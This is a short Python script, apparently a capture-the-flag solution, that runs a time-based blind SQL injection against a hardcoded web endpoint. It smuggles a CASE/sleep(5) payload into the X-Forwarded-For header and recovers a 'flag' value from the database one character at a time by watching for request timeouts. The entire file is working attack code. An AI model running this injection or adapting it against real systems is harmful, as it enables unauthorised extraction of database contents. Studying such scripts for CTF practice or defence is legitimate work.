import requests
import string 
 
mystring = string.ascii_letters+string.digits
url='http://123.206.87.240:8002/web15/'
data = "127.0.0.1'+(select case when (substring((select flag from flag) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1"  #这里的{}对应的是后面所需要的format
flag = ''
for i in range(1,35):
    for j in mystring:
        try:
            headers = {'x-forwarded-for':data.format(str(i),j)}
            res = requests.get(url,headers=headers,timeout=3)
        except requests.exceptions.ReadTimeout:
            flag += j
            print(flag)
            break
print('The final flag:'+flag)